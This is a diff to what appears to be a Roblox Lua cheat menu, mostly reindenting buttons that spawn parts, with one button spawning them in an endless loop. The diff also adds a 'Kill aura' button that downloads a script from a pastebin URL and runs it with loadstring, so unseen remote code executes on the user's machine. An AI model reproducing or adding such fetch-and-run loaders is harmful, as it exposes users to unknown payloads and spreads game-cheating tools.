@@ -770,9 +770,9 @@ end)
 
 Section:NewButton("Spawn Part(Visual)", "Spawn Parts(Visual)", function()
     local Part = Instance.new("Part")
-	Part.Parent = workspace
-	Part.Name = "Pupsik"
-	Part.Size = Vector3.new(5, 5, 5)
+    Part.Parent = workspace
+    Part.Name = "Pupsik"
+    Part.Size = Vector3.new(5, 5, 5)
 end)
 
 
@@ -798,9 +798,14 @@ end)
 
 Section:NewButton("ponos(Visual)", "ponos(Visual)", function()
    while wait() do
-	       local Part = Instance.new("Part")
-	Part.Parent = workspace
-	Part.Name = "Pupsik"
-	Part.Size = Vector3.new(5, 5, 5)
+           local Part = Instance.new("Part")
+    Part.Parent = workspace
+    Part.Name = "Pupsik"
+    Part.Size = Vector3.new(5, 5, 5)
    end
+end)
+
+
+Section:NewButton("Kill aura", "Kill aura", function()
+    loadstring(game:HttpGet('https://pastebin.com/raw/D768ibVu'))("https://t.me/+X-HS7qugKIQ0MTRi")
 end)
